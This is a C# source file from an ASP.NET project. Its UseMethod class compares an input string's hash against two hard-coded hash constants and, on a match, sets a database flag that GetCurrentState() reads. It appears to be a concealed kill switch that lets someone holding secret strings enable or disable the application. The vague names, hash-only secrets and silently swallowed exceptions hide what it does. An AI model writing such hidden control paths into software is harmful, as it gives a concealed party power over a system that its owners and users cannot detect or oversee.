using EasyStart.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace EasyStart.Logic
{
    public static class UseMethod
    {
        private const string s1 = "1943283414";
        private const string s2 = "-1931688329";
        public static void Use(string str)
        {
            var s = str.GetHashCode().ToString();

            try
            {
                using (var db = new AdminPanelContext())
                {
                    var uses = db.Uses.ToList();

                    if (s == s1)
                    {
                        if (uses == null || !uses.Any())
                        {
                            db.Uses.Add(new UseModel { Use = true });
                        }
                        else
                        {
                            var u = uses.First();
                            u.Use = true;
                        }

                        db.SaveChanges();

                        return;
                    }

                    if (s == s2)
                    {
                        if (uses == null || !uses.Any())
                        {
                            db.Uses.Add(new UseModel { Use = false });
                        }
                        else
                        {
                            var u = uses.First();
                            u.Use = false;
                        }

                        db.SaveChanges();
                        db.SaveChanges();
                        return;
                    }
                }
            }
            catch (Exception ex)
            { }
        }

        public static bool GetCurrentState()
        {
            var result = false;
            try
            {
                using (var db = new AdminPanelContext())
                {
                    var uses = db.Uses.ToList();

                    if (uses == null || !uses.Any())
                    {
                        result = true;
                    }
                    else
                    {
                        result = uses.First().Use;
                    }

                }
            }
            catch (Exception ex)
            {
                result = false;
            }

            return result;
        }
    }
}